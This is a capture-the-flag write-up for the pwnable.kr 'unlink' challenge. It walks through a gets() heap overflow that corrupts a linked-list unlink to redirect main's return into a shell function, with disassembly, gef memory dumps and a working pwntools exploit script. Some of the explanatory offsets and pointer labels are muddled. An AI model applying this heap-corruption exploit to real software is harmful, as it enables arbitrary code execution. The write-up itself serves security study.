We have the folllowing challenge:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

So what happens in here is we have a struct called `tagOBJ` (`OBJ`) which is the exact structure of a node structure of a doubly linked list, it holds a char array that should hold some data, and 2 pointer, `fd` for forward and `bk` for backwards.

Then inside, inside `main`, we allocate 1024 bytes without keeping the pointer to those, then we perform 3 allocations in the size of `OBJ` and keep them in three variables `A`, `B` and `C`.
We initialize the doubly linked list by setting it to be `A<->B<->C`, then we call `gets` and read from stdin and write into the `buf` variable in `A`. Then call `unlink` with `B` as the argument.


`Unlink`: (In our case `P`=`B`)
- Create 2 variables `BK` and `FD`
- temporarly save the backwards pointer of `P` in `BK`
- temporarly save the forwards pointer of `P` in  `FD`
- Set the forward pointer of `BK` to be `FD`
- Set the backwards pointer of `FD` to be `BK`

This code just removes an element from the linked list and fixes the pointers of the previous and next elements.

How can we exploit this code to call `shell`?

Maybe we can find a `call` instruction in the disassembly and overwrite the address it calls to somehow?
<b>There are exactly 0 `call` instructions after the call to `unlink` and therefore this is not an option.</b>

We can try to overwrite the return address of `unlink` and instead of returning to `main` we jump to `shell`
<b>Not possible. We don't have any interesting stack allocations in `unlink` and we can't overwrite the return address.</b>

We can try to overwrite the return address of main since we have some mallocs and we also have stack and heap leaks.

Let's try and figure out how main returns:
```bash
gef➤  disas main
Dump of assembler code for function main:
   0x0804852f <+0>:	lea    0x4(%esp),%ecx
   0x08048533 <+4>:	and    $0xfffffff0,%esp
   0x08048536 <+7>:	push   -0x4(%ecx)
   0x08048539 <+10>:	push   %ebp
   0x0804853a <+11>:	mov    %esp,%ebp
   0x0804853c <+13>:	push   %ecx
   0x0804853d <+14>:	sub    $0x14,%esp
   0x08048540 <+17>:	sub    $0xc,%esp
   0x08048543 <+20>:	push   $0x400
   0x08048548 <+25>:	call   0x80483a0 <malloc@plt>
   0x0804854d <+30>:	add    $0x10,%esp
   0x08048550 <+33>:	sub    $0xc,%esp
   0x08048553 <+36>:	push   $0x10
   0x08048555 <+38>:	call   0x80483a0 <malloc@plt>
   0x0804855a <+43>:	add    $0x10,%esp
   0x0804855d <+46>:	mov    %eax,-0x14(%ebp)
   0x08048560 <+49>:	sub    $0xc,%esp
   0x08048563 <+52>:	push   $0x10
   0x08048565 <+54>:	call   0x80483a0 <malloc@plt>
   0x0804856a <+59>:	add    $0x10,%esp
   0x0804856d <+62>:	mov    %eax,-0xc(%ebp)
   0x08048570 <+65>:	sub    $0xc,%esp
   0x08048573 <+68>:	push   $0x10
   0x08048575 <+70>:	call   0x80483a0 <malloc@plt>
   0x0804857a <+75>:	add    $0x10,%esp
   0x0804857d <+78>:	mov    %eax,-0x10(%ebp)
   0x08048580 <+81>:	mov    -0x14(%ebp),%eax
   0x08048583 <+84>:	mov    -0xc(%ebp),%edx
   0x08048586 <+87>:	mov    %edx,(%eax)
   0x08048588 <+89>:	mov    -0x14(%ebp),%edx
   0x0804858b <+92>:	mov    -0xc(%ebp),%eax
   0x0804858e <+95>:	mov    %edx,0x4(%eax)
   0x08048591 <+98>:	mov    -0xc(%ebp),%eax
   0x08048594 <+101>:	mov    -0x10(%ebp),%edx
   0x08048597 <+104>:	mov    %edx,(%eax)
   0x08048599 <+106>:	mov    -0x10(%ebp),%eax
   0x0804859c <+109>:	mov    -0xc(%ebp),%edx
   0x0804859f <+112>:	mov    %edx,0x4(%eax)
   0x080485a2 <+115>:	sub    $0x8,%esp
   0x080485a5 <+118>:	lea    -0x14(%ebp),%eax
   0x080485a8 <+121>:	push   %eax
   0x080485a9 <+122>:	push   $0x8048698
   0x080485ae <+127>:	call   0x8048380 <printf@plt>
   0x080485b3 <+132>:	add    $0x10,%esp
   0x080485b6 <+135>:	mov    -0x14(%ebp),%eax
   0x080485b9 <+138>:	sub    $0x8,%esp
   0x080485bc <+141>:	push   %eax
   0x080485bd <+142>:	push   $0x80486b8
   0x080485c2 <+147>:	call   0x8048380 <printf@plt>
   0x080485c7 <+152>:	add    $0x10,%esp
   0x080485ca <+155>:	sub    $0xc,%esp
   0x080485cd <+158>:	push   $0x80486d8
   0x080485d2 <+163>:	call   0x80483b0 <puts@plt>
   0x080485d7 <+168>:	add    $0x10,%esp
   0x080485da <+171>:	mov    -0x14(%ebp),%eax
   0x080485dd <+174>:	add    $0x8,%eax
   0x080485e0 <+177>:	sub    $0xc,%esp
   0x080485e3 <+180>:	push   %eax
   0x080485e4 <+181>:	call   0x8048390 <gets@plt>
   0x080485e9 <+186>:	add    $0x10,%esp
   0x080485ec <+189>:	sub    $0xc,%esp
   0x080485ef <+192>:	push   -0xc(%ebp)
   0x080485f2 <+195>:	call   0x8048504 <unlink>
   0x080485f7 <+200>:	add    $0x10,%esp
   0x080485fa <+203>:	mov    $0x0,%eax
   0x080485ff <+208>:	mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    -0x4(%ecx),%esp
   0x08048606 <+215>:	ret    
End of assembler dump.
```

Let's inspect the disassembly after the unlink call:
```bash
   0x080485f7 <+200>:	add    $0x10,%esp
   0x080485fa <+203>:	mov    $0x0,%eax
   0x080485ff <+208>:	mov    -0x4(%ebp),%ecx
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    -0x4(%ecx),%esp
   0x08048606 <+215>:	ret    
```

- add 0x10 to esp
- Put 0x0 in eax
- Load $ebp-4 into ecx
- Call leave (`main` finished so we finalize the function by popping ebp)
- we load the effective address in $ecx-4 into $esp

Now let's run the code and see what's the memory like before running these instructions.
```bash
gef➤  b *0x080485f7
Breakpoint 1 at 0x80485f7
gef➤  r
Starting program: /home/tom/repos/ctfs/pwnable.kr/unlink/unlink 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
here is stack address leak: 0xff864254
here is heap address leak: 0x84855b0
now that you have leaks, get shell!
A

Breakpoint 1, 0x080485f7 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x084855b0  →  0x084855f0  →  0x00000000
$ebx   : 0xf7e2a000  →  0x00229dac
$ecx   : 0xf7e2b9c0  →  0x00000000
$edx   : 0x084855f0  →  0x00000000
$esp   : 0xff864240  →  0x084855d0  →  0x084855f0  →  0x00000000
$ebp   : 0xff864268  →  0xf7f6b020  →  0xf7f6ba40  →  0x00000000
$esi   : 0xff864334  →  0xff86626b  →  "/home/tom/repos/ctfs/pwnable.kr/unlink/unlink"
$edi   : 0xf7f6ab80  →  0x00000000
$eip   : 0x080485f7  →  <main+200> add $0x10, %esp
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff864240│+0x0000: 0x084855d0  →  0x084855f0  →  0x00000000	 ← $esp
0xff864244│+0x0004: 0x084855b0  →  0x084855f0  →  0x00000000
0xff864248│+0x0008: 0xf7c184be  →  "_dl_audit_preinit"
0xff86424c│+0x000c: 0xf7f2c4a0  →  0xf7c00000  →  0x464c457f
0xff864250│+0x0010: 0xff864290  →  0xf7e2a000  →  0x00229dac
0xff864254│+0x0014: 0x084855b0  →  0x084855f0  →  0x00000000
0xff864258│+0x0018: 0x084855f0  →  0x00000000
0xff86425c│+0x001c: 0x084855d0  →  0x084855f0  →  0x00000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485ec <main+189>       sub    $0xc, %esp
    0x80485ef <main+192>       push   -0xc(%ebp)
    0x80485f2 <main+195>       call   0x8048504 <unlink>
 →  0x80485f7 <main+200>       add    $0x10, %esp
    0x80485fa <main+203>       mov    $0x0, %eax
    0x80485ff <main+208>       mov    -0x4(%ebp), %ecx
    0x8048602 <main+211>       leave  
    0x8048603 <main+212>       lea    -0x4(%ecx), %esp
    0x8048606 <main+215>       ret    
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unlink", stopped 0x80485f7 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485f7 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

So we are interested at `$ebp-4` and then `$ecx-4` since it is the address put in `$esp` which is popped at the `ret` called and then jumped to.

```bash
gef➤  x/xw $ebp-4
0xffb69b64:	0xffb69b80
gef➤  x/xw 0xffb69b80-4
0xffb69b7c:	0xf7c21519
```

And if we continute to `ret` we can see that `0xf7c21519` is actually our return address from main.
So our main goal is to overwrite `$ebp-4` so it holds a pointer to the address of `shell`.


How should we do it?
Each new run the stack and heap addresses change, luckily, the program leaks it for us, so we can still inspect the heap and stack on runtime.
```bash
gef➤  b *0x080485f2
Breakpoint 1 at 0x80485f2
gef➤  r
Starting program: /home/tom/repos/ctfs/pwnable.kr/unlink/unlink 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
here is stack address leak: 0xff9b69a4
here is heap address leak: 0x8fb35b0
now that you have leaks, get shell!
A

Breakpoint 1, 0x080485f2 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x08fb35b8  →  0x00000041 ("A"?)
$ebx   : 0xf7e2a000  →  0x00229dac
$ecx   : 0xf7e2b9c0  →  0x00000000
$edx   : 0x1       
$esp   : 0xff9b6990  →  0x08fb35d0  →  0x08fb35f0  →  0x00000000
$ebp   : 0xff9b69b8  →  0xf7fd7020  →  0xf7fd7a40  →  0x00000000
$esi   : 0xff9b6a84  →  0xff9b726b  →  "/home/tom/repos/ctfs/pwnable.kr/unlink/unlink"
$edi   : 0xf7fd6b80  →  0x00000000
$eip   : 0x080485f2  →  <main+195> call 0x8048504 <unlink>
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xff9b6990│+0x0000: 0x08fb35d0  →  0x08fb35f0  →  0x00000000	 ← $esp
0xff9b6994│+0x0004: 0x08fb35b0  →  0x08fb35d0  →  0x08fb35f0  →  0x00000000
0xff9b6998│+0x0008: 0xf7c184be  →  "_dl_audit_preinit"
0xff9b699c│+0x000c: 0xf7f984a0  →  0xf7c00000  →  0x464c457f
0xff9b69a0│+0x0010: 0xff9b69e0  →  0xf7e2a000  →  0x00229dac
0xff9b69a4│+0x0014: 0x08fb35b0  →  0x08fb35d0  →  0x08fb35f0  →  0x00000000
0xff9b69a8│+0x0018: 0x08fb35f0  →  0x00000000
0xff9b69ac│+0x001c: 0x08fb35d0  →  0x08fb35f0  →  0x00000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80485e9 <main+186>       add    $0x10, %esp
    0x80485ec <main+189>       sub    $0xc, %esp
    0x80485ef <main+192>       push   -0xc(%ebp)
 →  0x80485f2 <main+195>       call   0x8048504 <unlink>
   ↳   0x8048504 <unlink+0>       push   %ebp
       0x8048505 <unlink+1>       mov    %esp, %ebp
       0x8048507 <unlink+3>       sub    $0x10, %esp
       0x804850a <unlink+6>       mov    0x8(%ebp), %eax
       0x804850d <unlink+9>       mov    0x4(%eax), %eax
       0x8048510 <unlink+12>      mov    %eax, -0x4(%ebp)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
unlink (
   [sp + 0x0] = 0x08fb35d0 → 0x08fb35f0 → 0x00000000,
   [sp + 0x4] = 0x08fb35b0 → 0x08fb35d0 → 0x08fb35f0 → 0x00000000
)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "unlink", stopped 0x80485f2 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80485f2 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Our leaked addresses are:
- Stack address of `A`: `0xff9b69a4`
- Heap address of `A`: `0x8fb35b0`

So let's view our heap:
```bash
gef➤  heap chunk 0x8fb35b0
Chunk(addr=0x8fb35b0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
Chunk size: 32 (0x20)
Usable size: 28 (0x1c)
Previous chunk size: 0 (0x0)
PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA
```
We know the size that `A` occupies in memory is 32 bytes, If we want to see the memory view of `A`, `B` and `C` we want to view 96 bytes which is actually 24 words:
```bash
gef➤  x/24xw 0x8fb35b0
0x8fb35b0:	0x08fb35d0	0x00000000	0x00000041	0x00000000 <- A
0x8fb35c0:	0x00000000	0x00000000	0x00000000	0x00000021 <- A
0x8fb35d0:	0x08fb35f0	0x08fb35b0	0x00000000	0x00000000 <- B
0x8fb35e0:	0x00000000	0x00000000	0x00000000	0x00000021 <- B
0x8fb35f0:	0x00000000	0x08fb35d0	0x00000000	0x00000000 <- C
0x8fb3600:	0x00000000	0x00000000	0x00000000	0x00000411 <- C
```
We can see that the first 4 bytes of each object is the forward pointer, the next 4 bytes are the backwards pointer and the next 8 bytes are for the `buf` char, we can even see our `41` (`A`) as the ninth byte in `A`.

So we already see we can do a heap overflow here thanks to `gets` and override everything after the ninth byte in `A`, this includes all of `B` and `C` and whatever after it.

Let's look at `unlink` and see if we can exploit it using the given heap overflow: (Look at the notes i put in the disassembly)
```bash
gef➤  disas unlink
Dump of assembler code for function unlink:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	sub    $0x10,%esp
   0x0804850a <+6>:	mov    0x8(%ebp),%eax <- Address of `P`
   0x0804850d <+9>:	mov    0x4(%eax),%eax
   0x08048510 <+12>:	mov    %eax,-0x4(%ebp) <- Save address of the backwards pointer of `P` (`FD`)
   0x08048513 <+15>:	mov    0x8(%ebp),%eax
   0x08048516 <+18>:	mov    (%eax),%eax <- Save address of the forwrads pointer of `P` (`BK`)
   0x08048518 <+20>:	mov    %eax,-0x8(%ebp)
   0x0804851b <+23>:	mov    -0x8(%ebp),%eax - Load `BK` into eax
   0x0804851e <+26>:	mov    -0x4(%ebp),%edx - Load `FD` into edx
   0x08048521 <+29>:	mov    %edx,0x4(%eax) <- `BK->fd = FD` (1)
   0x08048524 <+32>:	mov    -0x4(%ebp),%eax
   0x08048527 <+35>:	mov    -0x8(%ebp),%edx
   0x0804852a <+38>:	mov    %edx,(%eax) <- `FD->bk=BK` (2)
   0x0804852c <+40>:	nop
   0x0804852d <+41>:	leave  
   0x0804852e <+42>:	ret    
End of assembler dump.
```

We can either exploit (1) or (2), since we write to an address, if we use (1) as an example in our `unlink(B)` call.

We can do the heap overflow and make sure `B->fd` is the address of the pointer to target function `shell` and `B->bk` is `$ebp-4`, so actually `B->fd` needs to be the address of the pointer to the `shell` address + 4,
Because we perform `lea    -0x4(%ecx),%esp`.

This should work because `B` will have 2 overwritten pointers:
- `B->fd` will become the address of the pointer to `shell` address (which is an address inside the heap)
- `B->bk` will become `$ebp-8`

Then when `BK->fd=FD` is executed what happens will be as follows:
- `BK->fd` is actually `B->bk->fd` but `B->bk` is `$ebp-8`, so we access this address, then `->fd` adds 4 bytes to it and we write to it `FD` which is `B->fd`, the address of the pointer to the address of `shell`.

So to sum it up, we wrote to `$ebp-4` the pointer of the address of `shell`

So then the final `lea` instruction will put `shell` address in `$esp` and we should jump to it on `ret`.

But how do we know to point to our inserted `shell` address?
<b>We know we start inserting data in `A`+ 0x08, so we can just point to `A`+0x1C so when we subtract 4 we'd point to `A`+0x08.</b>

Let's find out how far is `$ebp` from the leaked stack address:
```bash
gef➤  b *0x080485ff
Breakpoint 1 at 0x80485ff
gef➤  r
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
here is stack address leak: 0xffce9224
here is heap address leak: 0x837b5b0
now that you have leaks, get shell!
[....]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffce9220│+0x0000: 0xffce9260  →  0xf7e2a000  →  0x00229dac	 ← $esp
0xffce9224│+0x0004: 0x0837b5b0  →  0x0837b5f0  →  0x00000000
0xffce9228│+0x0008: 0x0837b5f0  →  0x00000000
0xffce922c│+0x000c: 0x0837b5d0  →  0x0837b5f0  →  0x00000000
0xffce9230│+0x0010: 0x00000001
0xffce9234│+0x0014: 0xffce9250  →  0x00000001
0xffce9238│+0x0018: 0xf7f59020  →  0xf7f59a40  →  0x00000000	 ← $ebp
0xffce923c│+0x001c: 0xf7c21519  →   add $0x10, %esp
[....]
```
`0xffce9238-0xffce9224`= 20 Bytes, `$ebp-8` is leaked stack address + 12

So how do we build the exploit? I definitely recommend building a script since the leaks change each run.

```python
import pwn

# SSH into machine
r = pwn.ssh(host="pwnable.kr", port=2222, user="unlink", password="guest")
io = r.process("./unlink")

# this is the address of $ebp-4
overwritten_addr = pwn.packing.pack(int(io.recvline().split()[-1].rstrip(), 0) + 16)

# this is the address of the shell address byte sequence, plus 4
helper_addr = pwn.packing.pack(int(io.recvline().split()[-1].rstrip(), 0) + 12)

# address of shell function
shell = b"\xeb\x84\x04\x08"

io.sendline(shell + b"\x00" * 12 + helper_addr + overwritten_addr)
io.interactive()
io.close()
r.close()
```

We also added 12 null bytes since the size of `OBJ` is 12 bytes inside the machine.

